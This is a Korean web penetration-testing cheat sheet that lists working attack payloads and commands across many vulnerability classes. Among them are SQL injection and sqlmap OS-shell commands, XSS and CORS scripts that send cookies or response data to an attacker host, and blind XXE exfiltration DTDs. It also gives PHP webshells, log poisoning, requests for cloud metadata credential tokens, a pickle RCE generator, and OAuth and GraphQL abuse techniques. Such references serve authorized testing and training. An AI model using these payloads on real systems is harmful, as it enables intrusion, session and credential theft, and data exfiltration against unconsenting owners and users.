# Web 공격

웹 애플리케이션을 대상으로 한 공격 기법. 외부 침투 시 주요 공격 벡터로, 내부망 접근을 위한 초기 침투 경로가 될 수 있다.

---

## 정보 수집

### 기술 스택 확인

```bash
# Wappalyzer 대안 - whatweb
whatweb <url>

# HTTP 헤더 확인
curl -I <url>
curl -v <url> 2>&1 | grep -i 'server\|x-powered\|x-aspnet'
```

### 디렉토리 / 파일 열거

```bash
# gobuster
gobuster dir -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50 -x php,asp,aspx,jsp,html,txt,bak

# feroxbuster (재귀 탐색)
feroxbuster -u <url> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 50 -x php,asp,aspx

# ffuf
ffuf -u <url>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50 -mc 200,301,302,403
```

### 서브도메인 열거

```bash
# ffuf vhost
ffuf -u <url> -H "Host: FUZZ.<domain>" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs <default_size>

# gobuster vhost
gobuster vhost -u <url> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain

# DNS 기반
gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### 파라미터 Fuzzing

```bash
# GET 파라미터
ffuf -u '<url>?FUZZ=test' \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs <default_size>

# POST 파라미터
ffuf -u '<url>' -X POST -d 'FUZZ=test' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs <default_size>
```

---

## SQL Injection

### 수동 테스트

```sql
# 기본 테스트 페이로드
' OR 1=1--
" OR 1=1--
' OR '1'='1
') OR ('1'='1

# UNION 기반 - 컬럼 수 확인
' ORDER BY 1-- -
' ORDER BY 2-- -
' UNION SELECT NULL,NULL,NULL-- -

# UNION 기반 - 데이터 추출
' UNION SELECT 1,username,password FROM users-- -

# Error 기반 (MSSQL)
' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))-- -

# Time 기반 Blind
' AND IF(1=1,SLEEP(5),0)-- -          # MySQL
'; WAITFOR DELAY '0:0:5'-- -          # MSSQL
' AND pg_sleep(5)-- -                 # PostgreSQL
```

### sqlmap

```bash
# 기본 사용
sqlmap -u '<url>?id=1' --batch

# POST 요청
sqlmap -u '<url>' --data='user=admin&pass=test' --batch

# 쿠키/헤더 포함
sqlmap -u '<url>?id=1' --cookie='session=abc123' --batch

# 데이터 덤프
sqlmap -u '<url>?id=1' --dbs                    # 데이터베이스 목록
sqlmap -u '<url>?id=1' -D <db> --tables         # 테이블 목록
sqlmap -u '<url>?id=1' -D <db> -T <tbl> --dump  # 데이터 덤프

# OS Shell (DBA 권한 시)
sqlmap -u '<url>?id=1' --os-shell
sqlmap -u '<url>?id=1' --os-cmd='whoami'

# WAF 우회
sqlmap -u '<url>?id=1' --tamper=space2comment,between --random-agent
```

---

## XSS (Cross-Site Scripting)

### Reflected XSS

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
```

### Stored XSS

게시판, 댓글, 프로필 등에 스크립트를 저장하여 다른 사용자가 해당 페이지 방문 시 실행되도록 한다.

```html
<!-- 쿠키 탈취 -->
<script>document.location='http://<attacker>/c?='+document.cookie</script>

<!-- fetch로 전송 -->
<script>fetch('http://<attacker>/c?='+document.cookie)</script>
```

### DOM-based XSS

```javascript
// URL fragment를 통한 injection
// 취약 코드: document.write(location.hash)
http://target.com/page#<script>alert(1)</script>
```

### 필터 우회

```html
<!-- 대소문자 -->
<ScRiPt>alert(1)</ScRiPt>

<!-- 이벤트 핸들러 -->
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>

<!-- encoding -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- 태그 블랙리스트 우회 -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

---

## SSRF (Server-Side Request Forgery)

```bash
# 내부 서비스 접근
http://127.0.0.1:80
http://localhost:80
http://[::1]:80

# AWS Metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

# AWS IMDSv2 (토큰 필요)
curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# → 토큰을 받아서 아래처럼 사용
curl -s -H "X-aws-ec2-metadata-token: <TOKEN>" http://169.254.169.254/latest/meta-data/

# GCP Metadata
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure IMDS
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# 우회 기법
http://0x7f000001         # hex
http://2130706433         # decimal
http://017700000001       # octal
http://127.1              # short form
http://0.0.0.0
```

---

## File Upload

```bash
# 확장자 우회
shell.php → shell.php5, shell.phtml, shell.phar, shell.phps
shell.asp → shell.aspx, shell.ashx, shell.asmx
shell.jsp → shell.jspx

# Content-Type 우회 (Burp에서 변경)
Content-Type: image/jpeg
Content-Type: image/png

# 이중 확장자
shell.php.jpg
shell.jpg.php

# Null byte (구 버전)
shell.php%00.jpg
shell.php\x00.jpg

# .htaccess 업로드 (Apache)
# 파일명: .htaccess, 내용:
AddType application/x-httpd-php .jpg

# 웹쉘 예시 (PHP)
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
```

---

## LFI / RFI (File Inclusion)

### LFI (Local File Inclusion)

```text
# 기본 경로 순회
../../../../etc/passwd
....//....//....//etc/passwd

# Null byte (PHP < 5.3)
../../../../etc/passwd%00

# Wrapper
php://filter/convert.base64-encode/resource=index.php
php://input (POST body에 PHP 코드)
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Windows
..\..\..\..\windows\system32\drivers\etc\hosts
```

### Log Poisoning (LFI → RCE)

```bash
# Apache access.log에 PHP 코드 삽입
curl -A "<?php system(\$_GET['cmd']); ?>" <url>
# 이후 LFI로 로그 파일 include
<url>?page=../../../../var/log/apache2/access.log&cmd=id
```

### RFI (Remote File Inclusion)

```text
# php.ini에서 allow_url_include=On 이어야 가능
http://target.com?page=http://attacker.com/shell.php
```

---

## Command Injection

```bash
# 기본 구분자
; id
| id
|| id
& id
&& id

# 줄바꿈
%0a id
%0d%0a id

# 백틱/달러
`id`
$(id)

# 필터 우회
# 공백 필터링
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd

# 키워드 필터링
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
```

---

## SSTI (Server-Side Template Injection)

### 탐지

```text
# 기본 탐지 페이로드
{{7*7}}       → 49이면 Jinja2/Twig
${7*7}        → 49이면 Freemarker/Velocity
#{7*7}        → 49이면 Thymeleaf
<%= 7*7 %>    → 49이면 ERB
```

### 익스플로잇

```python
# Jinja2 (Python)
{{ config.items() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__()[<idx>]('id',shell=True,stdout=-1).communicate() }}

# 간단한 RCE
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

```java
// Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

---

## JWT 공격

```bash
# JWT 디코딩 (base64)
echo '<jwt_token>' | cut -d'.' -f2 | base64 -d 2>/dev/null | jq

# None Algorithm
# Header를 {"alg":"none","typ":"JWT"}로 변경, signature 제거

# 약한 Secret 크래킹
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.txt

# jwt_tool
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
python3 jwt_tool.py <token> -X a    # alg:none
python3 jwt_tool.py <token> -X k    # key confusion
```

---

## Deserialization

### PHP

```php
// PHP Object Injection
O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}
```

### Java

```bash
# ysoserial
java -jar ysoserial.jar CommonsCollections1 'id' | base64

# 탐지: rO0AB (base64), aced0005 (hex)
```

### Python (Pickle)

```python
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

---

## XXE (XML External Entity)

### 기본 XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Blind XXE (Out-of-Band)

```xml
<!-- 공격자 DTD (attacker.com/evil.dtd) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;

<!-- 대상에 전송 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

### XXE via File Upload

```xml
<!-- SVG 파일 -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>

<!-- XLSX, DOCX (ZIP 내부 XML 편집) -->
```

### XXE → SSRF

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

---

## CSRF (Cross-Site Request Forgery)

```html
<!-- GET 기반 CSRF -->
<img src="http://target.com/admin/deleteUser?id=1">

<!-- POST 기반 CSRF (자동 제출) -->
<form action="http://target.com/account/changeEmail" method="POST" id="csrf">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- JSON body CSRF -->
<form action="http://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
```

!!! info "CSRF 토큰 우회"
    - 토큰 값 제거 (파라미터 자체를 삭제)
    - 다른 사용자의 토큰 재사용
    - HTTP method 변경 (POST → GET)
    - Content-Type 변경으로 preflight 우회

---

## CORS Misconfiguration

```bash
# Origin 반사 확인
curl -s -I -H "Origin: https://evil.com" https://target.com/api/data | grep -i 'access-control'

# null Origin 허용 확인
curl -s -I -H "Origin: null" https://target.com/api/data | grep -i 'access-control'
```

```html
<!-- 취약한 CORS 설정 악용 (credentials 포함) -->
<script>
var req = new XMLHttpRequest();
req.onload = function(){ 
  fetch('http://attacker.com/log?data=' + btoa(this.responseText)); 
};
req.open('GET','https://target.com/api/sensitive',true);
req.withCredentials = true;
req.send();
</script>
```

주요 취약 설정:

| 설정 | 위험도 |
|------|--------|
| `Access-Control-Allow-Origin: *` + credentials | 높음 |
| Origin 반사 (요청 Origin 그대로 응답) | 높음 |
| `null` Origin 허용 | 중간 |
| 서브도메인 와일드카드 (`*.target.com`) | 중간 |

---

## IDOR / Access Control

```bash
# 수평적 권한 상승 (다른 사용자 데이터 접근)
GET /api/users/1001 → GET /api/users/1002

# 수직적 권한 상승 (관리자 기능 접근)
GET /admin/dashboard  # 일반 사용자 세션으로
POST /api/users/1001/role  # 권한 변경

# UUID/GUID 예측 불가해 보여도 leak 가능
# 다른 API 응답, 에러 메시지, HTML 소스에서 ID 유출 확인

# API 버전 변경으로 인증 우회
/api/v2/users/1001 → /api/v1/users/1001

# HTTP method 변경
GET /api/users/1001 → PUT /api/users/1001 (body에 수정 데이터)

# 파라미터 오염
GET /api/users?id=1001&id=1002
```

---

## HTTP Request Smuggling

`Content-Length`와 `Transfer-Encoding` 헤더 해석 차이를 악용.

```http
# CL.TE (Front-end: Content-Length, Back-end: Transfer-Encoding)
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL (Front-end: Transfer-Encoding, Back-end: Content-Length)
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

```bash
# 탐지 도구
# smuggler.py
python3 smuggler.py -u https://target.com

# Burp Suite → HTTP Request Smuggler 확장
```

---

## Race Condition

동시 요청을 통해 비즈니스 로직을 우회하는 공격.

```bash
# Burp Suite Turbo Intruder (single-packet attack)
# 또는 curl 병렬 요청

# 할인 코드 중복 적용
for i in $(seq 1 20); do
  curl -s -X POST https://target.com/api/apply-coupon \
    -H "Cookie: session=TOKEN" \
    -d "code=DISCOUNT50" &
done
wait

# 잔액 초과 인출 (TOCTOU)
# 동시에 여러 출금 요청 전송
```

```python
# Python + threading
import threading, requests

def race():
    requests.post("https://target.com/api/transfer",
        cookies={"session": "TOKEN"},
        data={"amount": "1000", "to": "attacker"})

threads = [threading.Thread(target=race) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

---

## OpenAPI/Swagger 열거

REST API 사양이 노출되면 엔드포인트/스키마/권한 모델을 빠르게 파악 가능.

### 흔한 엔드포인트

```text
/swagger-ui.html
/swagger
/swagger.json
/openapi.json
/v2/api-docs
/v3/api-docs
/api-docs
/docs
```

### 빠른 확인

```bash
# HTTP 상태/타이틀로 확인
httpx -u https://target.com -paths /swagger,/swagger.json,/openapi.json,/v3/api-docs -status-code -title

# nuclei 템플릿
nuclei -t http/exposures/apis/swagger-ui.yaml -u https://target.com
nuclei -t http/exposures/apis/openapi.yaml -u https://target.com

# JSON 스키마 파싱
curl -s https://target.com/openapi.json | jq '.paths | keys[]'
```

### 악용 포인트

- Try-It-Out 프록시: Origin 검증 부재 시 CSRF/SSRF 연계
- 인증 미적용 엔드포인트: `/api/v1/*`와 `/api/v2/*` 혼재로 우회
- 스키마 불일치: 서버 실제 파라미터와 문서 상 차이 → HPP/IDOR 유발
- 넓은 CORS와 결합: 자바스크립트에서 토큰 포함 요청 가능 여부 확인

### 워크플로우

1) 엔드포인트 탐지 → 2) 스키마 덤프 후 Postman/Insomnia 가져오기 → 3) 권한/경계 값 퍼징 → 4) 멱등성/RateLimit 검증 → 5) 비즈니스 로직 테스트

---

## GraphQL 공격

GraphQL 은 단일 엔드포인트(`/graphql`, `/api/graphql`, `/v1/graphql` 등) 에 다양한 쿼리/뮤테이션을 받기 때문에 권한 분리/Rate Limit 가 자주 깨짐.

### 엔드포인트 식별

```bash
# 흔한 경로 퍼징
ffuf -u http://TARGET/FUZZ -w \
  /usr/share/seclists/Discovery/Web-Content/graphql.txt -mc 200,400

# Apollo / Hasura / GraphiQL 노출
curl -s http://TARGET/graphql | grep -iE 'graphiql|playground|apollo'

# nuclei
nuclei -t http/exposures/apis/graphql-detect.yaml -u http://TARGET
```

### Introspection

```bash
# 전체 스키마
curl -s http://TARGET/graphql -X POST -H 'Content-Type: application/json' \
  -d '{"query":"query IntrospectionQuery { __schema { queryType{name} mutationType{name} types{name kind fields{name type{name kind ofType{name}}}}}}"}' \
  | jq .

# Burp 확장: InQL
inql -t http://TARGET/graphql

# Introspection 비활성화 시 추정 (clairvoyance)
clairvoyance -o schema.json http://TARGET/graphql -w wordlist.txt
```

### 인증/인가 우회

```bash
# alias 로 동일 필드 N번 요청 (rate limit 우회)
{"query":"{ a:user(id:1){email} b:user(id:2){email} c:user(id:3){email} }"}

# fragment 로 권한 체크 우회 (필드 단위 ACL 누락)
{"query":"{ users { ...PII } } fragment PII on User { id email passwordHash mfaSecret }"}

# directive 로 조건부 노출
{"query":"query($x:Boolean!){ user(id:1) @include(if:$x){ email } }","variables":{"x":true}}

# JWT/세션 헤더 변경하며 동일 mutation 반복 → IDOR 자동화
```

### Batching / Query Stacking

```bash
# JSON 배열로 다중 쿼리 (rate limit / brute force 우회)
[{"query":"mutation{login(u:\"a\",p:\"p1\"){t}}"},
 {"query":"mutation{login(u:\"a\",p:\"p2\"){t}}"},
 {"query":"mutation{login(u:\"a\",p:\"p3\"){t}}"}]

# Apollo Persisted Queries 우회: APQ 해시 강제 미사용
{"query":"...","extensions":{}}
```

### DoS / Cost

```bash
# 깊이 폭주
{ user{ friends{ friends{ friends{ friends{ id } } } } } }

# 비용 폭주 (페이징 N x M)
{ users(first:10000){ posts(first:10000){ id } } }

# Apollo / 일부 서버는 maxAliases / maxDepth / cost analysis 미적용
```

### 뮤테이션 악용

```bash
# 권한 검사가 query 에만 있고 mutation 에 없는 경우
{"query":"mutation{ updateUser(id:1, role:\"admin\"){id role}}"}
{"query":"mutation{ resetPassword(userId:1, newPassword:\"x\"){ok}}"}

# Webhook / file upload mutation → SSRF / 임의 파일 업로드
```

### 도구

- [InQL](https://github.com/doyensec/inql) — Burp 확장, 스키마 시각화/요청 생성
- [GraphQL Voyager](https://github.com/IvanGoncharov/graphql-voyager) — 스키마 시각화
- [graphw00f](https://github.com/dolevf/graphw00f) — GraphQL 엔진 핑거프린팅
- [clairvoyance](https://github.com/nikitastupin/clairvoyance) — Introspection 차단 우회
- [graphqlmap](https://github.com/swisskyrepo/GraphQLmap) — 인터랙티브 익스플로잇

---

## OAuth 공격

### 식별

```bash
# Authorization Server / 메타데이터
curl -s https://auth.target.com/.well-known/openid-configuration | jq .
curl -s https://auth.target.com/.well-known/oauth-authorization-server | jq .

# JWKS (서명 키)
curl -s https://auth.target.com/.well-known/jwks.json | jq .
```

### redirect_uri 악용

```text
# 허용 매칭이 약할 때
https://auth.target.com/authorize?
  client_id=ID&response_type=code&
  redirect_uri=https://target.com.attacker.com/cb           # 서픽스 매칭 우회
  redirect_uri=https://target.com@attacker.com/cb           # @ 트릭
  redirect_uri=https://attacker.com/?https://target.com/cb  # query 인자 트릭
  redirect_uri=https://target.com/redirect?to=//attacker    # Open Redirect chain
```

대상 흐름:

| 결과 | 영향 |
|------|------|
| Authorization Code 가 attacker.com 로 전달 | code → token 교환 (PKCE 미사용 시 즉시 탈취) |
| Implicit `response_type=token` 으로 access_token Fragment 유출 | Referer/JS 통해 즉시 탈취 |

### state / nonce 미검증 → CSRF / 계정 탈취

```text
# state 가 검증되지 않으면 공격자가 자기 OAuth flow 의 code 를 피해자 계정에 강제 연결
1. 공격자가 IdP 로그인 → code 획득
2. 피해자에게 https://app.target.com/oauth/callback?code=ATTACKER_CODE 클릭 유도
3. 피해자 세션이 공격자 IdP 계정과 link 됨 → 공격자가 그 계정으로 로그인 가능
```

### Authorization Code Injection / Replay

```text
- code 가 한 번만 사용 가능한지 (one-time use)
- code 가 redirect_uri/client_id 와 바인딩되는지 (PKCE code_verifier)
- code 만료 시간이 충분히 짧은지 (보통 60s)

PKCE 미적용 모바일/SPA 클라이언트는 code 탈취만으로 토큰 교환 가능.
```

### scope / audience confusion

```bash
# 다른 클라이언트의 토큰을 우리 API 에 사용 (aud 미검증)
curl -H "Authorization: Bearer <other_client_token>" https://api.target.com/v1/me

# scope 상승 - authorize 단계에서 추가 scope 요청
?scope=openid profile email admin write:all

# Resource Server 에서 scope 검증 누락이면 추가 권한 획득
```

### JWT 기반 토큰 공격

상세는 [JWT 공격](#jwt-공격) 섹션 참고. 주요 포인트:

- `alg=none`, `kid` injection, JWKS spoofing
- access_token 과 id_token 혼용 (Resource Server 가 id_token 도 받는 경우 audience 우회)
- refresh_token rotation 미적용 → 영구 탈취

### Client Secret / Credentials 노출

```bash
# SPA / 모바일 앱에서 client_secret 하드코딩 (있으면 안되는 값)
strings app.apk | grep -iE 'client_secret|api_key'

# .well-known/security.txt, /.git/, /env 노출
```

### Device Authorization Grant phishing

```text
# device flow 코드를 피해자에게 전달 → 피해자가 본인 계정으로 승인 → 공격자가 폴링하던 토큰 획득
POST /device/code → user_code 입력 페이지 URL 을 피싱 메일로 전달
```

### 도구

- [oauth2c](https://github.com/cloudentity/oauth2c) — CLI OAuth client (테스트용)
- [BurpSuite OAuth Token Spoofer]
- [Authz0](https://github.com/hahwul/authz0) — 권한 매트릭스 자동 검증
- 패치 매핑: [oauth.net 보안 권고](https://oauth.net/articles/authentication/)

---

## 유용한 도구

| 도구 | 용도 |
|------|------|
| Burp Suite | 웹 프록시, 스캐너 |
| ffuf | 웹 퍼저 |
| sqlmap | SQL Injection 자동화 |
| nikto | 웹 취약점 스캐너 |
| wfuzz | 웹 퍼저 |
| jwt_tool | JWT 공격 |
| ysoserial | Java Deserialization |
| nuclei | 템플릿 기반 취약점 스캐너 |
